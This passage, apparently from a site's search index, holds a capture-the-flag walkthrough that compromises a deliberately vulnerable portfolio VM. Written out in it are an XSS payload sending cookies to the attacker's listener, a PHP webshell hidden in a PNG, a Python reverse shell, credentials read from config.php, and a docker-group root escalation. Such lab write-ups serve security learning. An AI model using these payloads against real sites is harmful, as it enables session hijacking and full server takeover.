pwned</p>"},{"location":"ch3ckm8_HTB_tombwatcher/#summary","title":"Summary","text":""},{"location":"ch3ckm8_HTB_tombwatcher/#sidenotes","title":"Sidenotes","text":""},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/","title":"RoboGRoot's-Portfolio","text":""},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#intro","title":"Intro","text":"<p>This is a linux machine, custom made by my friend RoboGR00t  </p> <p>Description: <pre><code>A passionate web developer recently launched his personal portfolio website, proudly displaying his projects and sharing his thoughts through a vibrant blog. His focus on design and functionality has left glaring security holes.\n\nAs his blog gains popularity, you, a skilled hacker, spot the perfect target. Your mission is clear: exploit the vulnerabilities, compromise his site, and expose his negligence. Every weakness is an opportunity, every oversight a path to control.\n\nIn this CTF challenge, you are the hacker. Uncover the flaws, break through the defenses, and leave your mark on the developer\u2019s digital pride.\n\nWelcome to \"Portfolio CTF\" The game is on. Good luck!\n</code></pre></p> <p>[[linux]] [[WebApp]] [[XSS]] [[RCE]] [[Docker]]</p> <p>Tags: #linux #WebApp #XSS #RCE #Docker Tools used:  netdiscover Dirbuster gobuster</p> <p>CTF link: https://www.less-secure.com/2024/07/ctf-portfolio-walkthrough.html</p>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#vmware-setup","title":"Vmware setup","text":"<p>First things first, download the .ova file, import it on vmware. Next, both on  vulnerable machine, set the network to \"Host only\", which puts it in a private network . Then the vulnerable host will be discoverable from our attacker machine and we can move on. The attacker machine is connected to NAT network option.</p>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#first-lets-find-our-ip-address-inet","title":"First, lets find our ip address (inet)","text":"<pre><code>ifconfig\n</code></pre> <pre><code>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\ninet 192.168.111.129  netmask 255.255.255.0  broadcast 192.168.111.255\ninet6 fe80::9ece:1e2d:11bd:668f  prefixlen 64  scopeid 0x20&lt;link&gt;\nether 00:0c:29:ee:33:58  txqueuelen 1000  (Ethernet)\nRX packets 65605  bytes 3949265 (3.7 MiB)\nRX errors 0  dropped 0  overruns 0  frame 0\nTX packets 66132  bytes 3978396 (3.7 MiB)\nTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n</code></pre>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#we-get-the-subnet-from-inet-192168111xxx-and-then-search-the-network-to-find-the-vulnerable-machine","title":"we get the subnet from inet (192.168.111.xxx), and then search the network to find the vulnerable machine:","text":"<p><pre><code>sudo nmap -sn -vvv -T5 192.168.111.1/24 # 192.168.194.X replace with your NAT network\n</code></pre> this will output some hosts to be up, after some trial and error i found that the vulnerable machine has the ip address 192.168.111.128 </p>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#reconnaissance","title":"Reconnaissance","text":""},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#lets-start-with-searching-for-open-ports","title":"lets start with searching for open ports","text":"<pre><code>nmap -p- --open -T4 192.168.111.128\n</code></pre> <pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 17:55 EDT\nNmap scan report for 192.168.111.128\nHost is up (0.00074s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https\nMAC Address: 00:0C:29:20:0A:ED (VMware)\n\nNmap done: 1 IP address (1 host up) scanned in 15.08 seconds\n</code></pre> <p>What we can see here is that 3 ports are open - 22 -&gt; SSH service - 80 -&gt; HTTP service - 443 -&gt; HTTPs service</p> <p>Lets narrow it down even further, and try finding information about the services of each open port: <pre><code>nmap -p22,80,443 -sCV -T4 192.168.111.128\n</code></pre></p> <pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 18:05 EDT\nNmap scan report for 192.168.111.128\nHost is up (0.00028s latency).\n\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 d5:9d:f8:aa:c9:ba:36:92:ab:de:ae:b6:a3:b4:2e:6d (ECDSA)\n|_  256 d3:61:f9:e6:5d:79:4d:45:5f:2b:21:2f:78:92:06:30 (ED25519)\n80/tcp  open  http     Apache httpd 2.4.52\n|_http-title: Did not follow redirect to http://portfolio.local/\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n443/tcp open  ssl/http Apache httpd 2.4.52\n| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU\n| Not valid before: 2023-11-05T04:24:05\n|_Not valid after:  2024-11-04T04:24:05\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\n|_http-title: Did not follow redirect to https://portfolio.local/\nMAC Address: 00:0C:29:20:0A:ED (VMware)\nService Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 27.22 seconds\n</code></pre> <p>As we can see, we get important information about the open services, for example the apache version, lets continue And since we have no info about ssh creds, the only way would be to try http first.</p> <p>lets add the host to the /etc/hosts</p> <pre><code>echo \"192.168.111.128   portfolio.local\" | sudo tee -a /etc/hosts\n</code></pre> <p>now we can navigate through the web app, go to our browser  great! its accessbile, now lets investigate further and gather more information about it</p>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#web-app-enumeration","title":"Web app Enumeration","text":""},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#directory-file-and-subdomain-enumeration","title":"Directory, file and subdomain enumeration","text":"<p>One way to move further, would be to search for subdomains, lets use Dirbuster for this  hit start, and let it run, it will take some time according to your hardware, and the number of assigned threads.</p> <p>Finally, the output from Dirbuster gives us this <pre><code>--------------------------------\nhttp://portfolio.local:80\n--------------------------------\nDirectories found during testing:\n\nDirs found with a 200 response:\n/img/\n/\n/src/\n\nDirs found with a 403 response:\n/icons/\n/icons/small/\n/server-status/\n--------------------------------\nFiles found during testing:\n\nFiles found with a 200 responce:\n\n/index.html\n/about.html\n/projects.html\n/experience.html\n/skills.html\n/contact.html\n/src/style.css\n/send.php\n--------------------------------\n</code></pre></p> <p>hm after searching these pages, i found the following: - /img/ has the jpeg used in the homepage </p> <ul> <li> <p>/src/style.css has nothing interesting, also the rest of them are pages with irrelevant information</p> </li> <li> <p>contact.html So the rest of the pages have no points of interest, except the contact.html page, which appears to have some sort of contact form containing text boxes and text areas.</p> </li> </ul> <p>By opening the source of the page, we can see that the contact form section, uses the send.php via post method: <pre><code>&lt;!-- Contact Page Content --&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;title&gt;Contact Me&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"src/style.css\"&gt;\n&lt;/head&gt;\n&lt;body class=\"body\"&gt;\n    &lt;nav&gt;\n        &lt;ul class=\"nav_ul\"&gt;\n            &lt;li class=\"nav_li\"&gt;&lt;a href=\"index.html\"&gt;Home&lt;/a&gt;&lt;/li&gt;\n            &lt;li class=\"nav_li\"&gt;&lt;a href=\"about.html\"&gt;About&lt;/a&gt;&lt;/li&gt;\n            &lt;li class=\"nav_li\"&gt;&lt;a href=\"projects.html\"&gt;Projects&lt;/a&gt;&lt;/li&gt;\n            &lt;li class=\"nav_li\"&gt;&lt;a href=\"experience.html\"&gt;Experience&lt;/a&gt;&lt;/li&gt;\n            &lt;li class=\"nav_li\"&gt;&lt;a href=\"skills.html\"&gt;Skills&lt;/a&gt;&lt;/li&gt;\n            &lt;li class=\"nav_li\"&gt;&lt;a href=\"contact.html\"&gt;Contact&lt;/a&gt;&lt;/li&gt;\n        &lt;/ul&gt;\n    &lt;/nav&gt;\n&lt;header class=\"contact_header\"&gt;\n    &lt;h1&gt;Contact Me&lt;/h1&gt;\n&lt;/header&gt;\n\n&lt;div class=\"contact_content\"&gt;\n&lt;section class=\"contact_info\"&gt;\n    &lt;h2&gt;Contact Information&lt;/h2&gt;\n    &lt;p class=\"email\"&gt;\n        &lt;span class=\"w_email\"&gt;Email:&lt;/span&gt; gpapadopoulos@portfolio.local\n        &lt;br&gt;\n    &lt;/p&gt;\n    &lt;p class=\"phone\"&gt;\n        &lt;span class=\"w_phone\"&gt;Phone:&lt;/span&gt; +123-456-7890\n        &lt;br&gt;\n    &lt;/p&gt;\n&lt;/section&gt;\n&lt;section class=\"contact_form\"&gt;\n    &lt;h2&gt;Tell Me Your Ideas&lt;/h2&gt;\n    &lt;form action=\"send.php\" method=\"post\"&gt;\n        &lt;label for=\"name\"&gt;&lt;/label&gt;\n        &lt;input class=\"input\" placeholder=\"Name\" type=\"text\" id=\"name\" name=\"name\" required&gt;&lt;br&gt;\n\n        &lt;label for=\"email\"&gt;&lt;/label&gt;\n        &lt;input class=\"input\" placeholder=\"Email\" type=\"email\" id=\"email\" name=\"email\" required&gt;&lt;br&gt;\n\n        &lt;label for=\"message\"&gt;&lt;/label&gt;\n        &lt;textarea class=\"input textarea\" placeholder=\"Message\" id=\"message\" name=\"message\"  required&gt;&lt;/textarea&gt;&lt;br&gt;\n\n        &lt;button class=\"form_button\" type=\"submit\"&gt;Send Message&lt;/button&gt;\n    &lt;/form&gt;\n&lt;/section&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&lt;!--Todo: add link for blog.portfolio.local --&gt;\n</code></pre></p> <p>but what appears valuable is the fact that in the end of the source code there is a comment indicating the presence of a subdomain called: blog.portfolio.local</p> <p>BUT, lets assume the comment wasnt there, and i wanted to search for subdomains, having no clues or hints about them.</p>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#subdomain-enumeration","title":"Subdomain enumeration","text":"<p>since directory and file scan did not provide anything usefull, lets now move on to search for subdomains, using gobuster.</p> <p>first i needed to download the most commonly used wordlist for subdomain enumeration (subdomains-top1million-5000.txt)</p> <p>in general, to find subdomains using gobuster you use this command: <pre><code>gobuster dns -d &lt;domain&gt; -w /usr/share/wordlists/subdomains/top5000subdomains -i \u2013wildcard\n</code></pre></p> <p>for this machine, i used this: <pre><code>gobuster dns -q -r 8.8.8.8 -d portfolio.local -w subdomains-top1million-5000.txt -t 4 --delay 1s -o results.txt \n</code></pre> after a while i got this result, and it appears that no other subdomains were found by gobuster: <pre><code>Found: blog.portfolio.local\n</code></pre> now lets add it in etc/hosts and browser it <pre><code>echo \"192.168.111.128 blog.portfolio.local\" | sudo tee -a /etc/hosts\n</code></pre> we come across this page: </p> <p>now lets do again directory and file enumeration but for this subdomain, like we did for portfolio.local with Dirbuster, lets use gobuster this time (more convenient for me)</p>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#directory-and-file-enumeration-for-the-subdomain","title":"Directory and file enumeration for the subdomain","text":"<p><pre><code>gobuster dir -e -t50 -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u blog.portfolio.local\n</code></pre> and got this output: <pre><code>===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\nhttp://blog.portfolio.local/.php                 (Status: 403) [Size: 285]\nhttp://blog.portfolio.local/.html                (Status: 403) [Size: 285]\nhttp://blog.portfolio.local/index.php            (Status: 200) [Size: 3415]\nhttp://blog.portfolio.local/img                  (Status: 301) [Size: 326] [--&gt; http://blog.portfolio.local/img/]\nhttp://blog.portfolio.local/login.php            (Status: 200) [Size: 639]\nhttp://blog.portfolio.local/admin.php            (Status: 302) [Size: 0] [--&gt; login.php]\nhttp://blog.portfolio.local/post.php             (Status: 200) [Size: 785]\nhttp://blog.portfolio.local/upload.php           (Status: 200) [Size: 0]\nhttp://blog.portfolio.local/src                  (Status: 301) [Size: 326] [--&gt; http://blog.portfolio.local/src/]\nhttp://blog.portfolio.local/logout.php           (Status: 302) [Size: 0] [--&gt; index.php]\nhttp://blog.portfolio.local/background           (Status: 301) [Size: 333] [--&gt; http://blog.portfolio.local/background/]\nhttp://blog.portfolio.local/config.php           (Status: 200) [Size: 0]\nhttp://blog.portfolio.local/.php                 (Status: 403) [Size: 285]\nhttp://blog.portfolio.local/.html                (Status: 403) [Size: 285]\nhttp://blog.portfolio.local/server-status        (Status: 403) [Size: 285]\nProgress: 882240 / 882244 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre></p> <p>We see multiple pages here, lets start inspecting: - /img/ and /background contains the imgs used, nothing interesting  - /src/ contains the css styles for multiple pages - config.php, upload.php, logout.php appear not accessible - login.php and admin.php</p> <p>Lets inspect the login.php page: (also admin.php redirects to login.php) </p> <ul> <li>post.php and then i also found a page where it seems that you can write a post and publish it </li> </ul> <p>Hm, so what now? We found 2 pages (login , post), that there is a high possibility to be vulnerable, because they expect input from the user.</p> <p>So, for the login page, we could check if SQL injection is possible:</p>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#checking-for-sql-injection","title":"Checking for SQL injection","text":"<p>username: <pre><code>' OR '1'='1\n</code></pre> password: anything -&gt; But no luck, it does not seem to be vulnerable to sql injection, lets focus then on the post page</p> <p>For the post page, we can search for vulnerabilities, such as XSS</p>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#checking-for-xss","title":"Checking for XSS","text":"<p>lets try different tags on the title and content areas, starting by \"/script\" <pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;\n</code></pre> no luck..., lets try with \"img\" <pre><code>&lt;img src=\"x\" onerror=\"alert('XSS')\"/&gt;\n</code></pre> no luck..., lets try with \"svg\" <pre><code>&lt;svg xmlns='' onload='alert(\"XSS\")'/&gt;\n</code></pre></p> <p>aaaand we get the popup! that means its vulnerable to XSS :) </p> <p>So now that we have found the vulnerability, the reconnaisanse stage stops, lets move on to the foothold</p>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#foothold","title":"Foothold","text":"<p>So now we know that post.php page is vulnerable to XSS, but how can we exploit it?</p> <p>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.</p> <p>Cross-Site Scripting (XSS) attacks occur when: 1. Data enters a Web application through an untrusted source, most frequently a web request. 2. The data is included in dynamic content that is sent to a web user without being validated for malicious content. https://owasp.org/www-community/attacks/xss/</p> <pre><code>python3 -m http.server 8080\n</code></pre> <pre><code>&lt;svg xmlns='' onload='fetch(\"http://192.168.111.129:8080/exfil?cookies=\" + encodeURIComponent(document.cookie))'/&gt;\n</code></pre> <p> the cookie here is: iha5l02lih8lgrukq0af0bih40 (caution, %3D is =, so take the rest of it)</p> <p>so take the cookie from your terminal (which you received on localhost), and go to the browser on storage, and change whatever value there with the cookie you received above  then just hit login or go to admin.php directly and you are in </p> <p>Great! we got progress here, we managed to reach the admin panel, right here, we see that file upload is possible, and this means only one thing -&gt; SHELL</p> <p>Right here, it seems to let you change the background image by uploading a picture</p> <p>So our goal now is to upload a file, that will give us a shell, this can be achieved by webshell and specifically a php one. Here is a simple php webshell that we could use: <pre><code>&lt;?php echo '&lt;pre&gt;' . shell_exec($_GET['cmd']) . '&lt;/pre&gt;';?&gt;\n</code></pre> we then choose file, and then upload, BUT we get the following message:  hm.. interesting, this means that we can only upload files with these extensions, so we must find a way to pass the webshell as an image</p> <p>i found a png image  and then did  the following <pre><code>cat picture.png webshell.php &gt; picture.png.php\n</code></pre></p> <p>and now it seems it has been uploaded successfully! </p> <p>BUT we need to find where is this file we uploaded located, and if you remember from the recon phase, there was the /background directory and the HINT was that the admin panel mentions that the background can be changed </p> <p>So here is our file: </p> <p>so now if we click on it  we see some output, lets now check if we can run commands via get_cmd (which we specified in the webshell via shell_exec)  and we can see, we can run commands, and above was an example of running the whoami command nice, our webshell worked, lets continue now, </p> <p>so for our convenience, it would make more sense if we could get a rev shell</p> <pre><code>export RHOST=\"192.168.111.129\";export RPORT=9999;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'\n</code></pre> <p>and similarly we placed it here  aand we got rev shell  stabilizing shell <pre><code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre> and we are ready to continue </p>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#from-www-data-to-user","title":"From www-data to user","text":"<p>Now lets try going from www-data to an actual user lets see what permission we have now first: <pre><code>id\n</code></pre> output: <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre> okay, now lets enumerate the users  <pre><code>cat /etc/passwd\n</code></pre> output: <pre><code>www-data@portfolio:/var/www/html/blog/background$ cat /etc/passwd\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:104::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\npollinate:x:105:1::/var/cache/pollinate:/bin/false\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\nsyslog:x:107:113::/home/syslog:/usr/sbin/nologin\nuuidd:x:108:114::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:109:115::/nonexistent:/usr/sbin/nologin\ntss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false\nlandscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin\nfwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\nusbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nwebadmin:x:1000:1000:webadmin:/home/webadmin:/bin/bash\nlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false\nmysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false\ngpapadopoulos:x:1001:1001:Georgios Papadopoulos,,,:/home/gpapadopoulos:/bin/bash\ndnsmasq:x:115:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\n</code></pre> what stands out as an actual user (and not an app or system related looking one), is gpapadopoulos</p> <p>Moving forward, since we have a shell, lets browse some files and directories, for example:</p> <p>This is the root directory of the website </p> <p>Lets view something we did not have visivility earlier, like the source code of the some of the .php files</p> <p>After inspecting them, i found that config.php contains the creds of user gpapadopoulos <pre><code>www-data@portfolio:/var/www/html/blog$ cat config.php\n&lt;?php\n\n$db_host = 'localhost';\n$db_name = 'blog_db';\n$db_user = 'gpapadopoulos';\n$db_password = 'Ju5t_4_d3v_mak1ng_s0ftwar3';\n\n?&gt;\n</code></pre> so we can now login as user gpapadopoulos! lets do it via ssh (ssh service is open according to our recon phase)</p> <p>we are in!  user flag found! <pre><code>dd83c5e0ae54a279d2f65d9020541aec\n</code></pre></p>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#privilege-escalation","title":"Privilege escalation","text":"<p>since we got foothold, we must check the permisissions it has  interesting, it seems that all permissions are related to himself, but he appears to be in a group called docker!</p> <p>this should be our target, so lets gather information about that group</p> <p>i also see processes related to docker are being run as root, it might be related somehow with the docker group <pre><code>ps aux | grep docker\n</code></pre> </p> <p>lets find more info about this group, for example what files can its members run: <pre><code>find / -group docker 2&gt;/dev/null\n</code></pre> <pre><code>/run/docker.sock\n</code></pre> hm interesting, what is this file tho?</p> <p>with some research, i found that:  docker.sock is the UNIX socket that Docker daemon is listening to. Its the interface between Docker clients and the Docker daemon..</p> <p>lets check the permissions of this file <pre><code>cd /run/docker.sock\nls -la\n</code></pre> </p> <p>its obvious that root user has access to it - <code>s</code>: This is a Unix domain socket. - <code>rw-rw----</code>:     - Owner (<code>root</code>): read/write     - Group (<code>docker</code>): read/write     - Others: no access - <code>docker.sock</code> belongs to group <code>docker</code>.</p> <p>with some research i gathered information about this particular docker file:</p>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#if-you-can-readwrite-to-rundockersock-you-can","title":"If you can read/write to <code>/run/docker.sock</code>, you can:","text":"<ul> <li>Control Docker fully</li> <li>Create and run containers</li> <li>Mount host filesystems</li> <li>Escape containers</li> <li>Gain full root access to the host</li> </ul> <p>so since user gpapadopoulos is member of the docker group, he must be able to get a root shell via the container itself! <pre><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n</code></pre> and it seems to have worked!  now run  <pre><code>bash -i\n</code></pre> and grab the root flag! <pre><code>21e772231c7e3665b6448e6f513def4d\n</code></pre> PWNED!</p>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#reconnaissance_1","title":"Reconnaissance","text":"<ol> <li>netdiscover -&gt; get ip of the vulnerable machine running locally</li> <li>nmap scan -&gt; chose http/https service to focus on</li> <li>enumerate directories and files-&gt; found subdomain</li> <li>enumerate directories and files of the subdomain-&gt; found page vulnerable to XSS</li> </ol>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#foothold_1","title":"Foothold","text":"<ol> <li>since the page is vulnerable to XSS, exploit it to get the admin's session cookie</li> <li>after stealing the session cookie, logging as admin shows us the admin page, which has file upload available (but only of image type)</li> <li>crafted webshell and embedded it on any picture, and uploaded</li> <li>got RCE and then rev shell</li> <li>logged in as www-data , from there after searching the directories performed user enumeration and found a username via the etc/shadow</li> <li>as www-data also found that a page config.php had this user's password</li> <li>logged in as user and grabbed the flag so the foothold path was: websitepage -&gt; XSS -&gt; RCE -&gt; rev shell -&gt; www-data -&gt; user</li> </ol>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#privesc","title":"Privesc","text":"<ol> <li>now that we got foothold, as a user (gpapadopoulos) i found that he is member of a group called docker</li> <li>later i found that group has a type of docker access that allows running commands as root</li> <li>running a specific command to get root shell via the docker container got me the root flag!</li> </ol>"},{"location":"ch3ckm8_RoboGRoot-CTF_Portfolio/#sidenotes","title":"Sidenotes","text":"<p>All in all, this custom made machine by RoboGR00t felt like an easy HackTheBox machine, so it can be classified as challenging.</p> <p>The initial access part involved a multitude of things to enumerate the host and its running webapp.  The foothold part was kinda straightforward with the use of XSS, and the cookie hijacking could be classified as the most difficult part of the foothold process. Also during the foothold part a webshell could be uploaded by exploiting RCE and using rev shell to get a shell as www-data, and with some search on the directories creds for a user could be found. The privesc part, was somehow straightforward too, exploiting the permissions of the user's group membership to get a root shell.</p>"},{"location":"codereview/","title":"codereview","text":"<p>codereview.md</p>"},{"location":"commandinjection/","title":"commandinjection","text":"<p>commandinjection.md</p>"},{"location":"gpo/","title":"gpo","text":"<p>gpo.md</p>"},{"location":"linux/","title":"linux","text":"<p>linux.md</p>"},{"location":"windows/","title":"Windows","text":""},{"location":"windows/#windows","title":"Windows","text":""}]}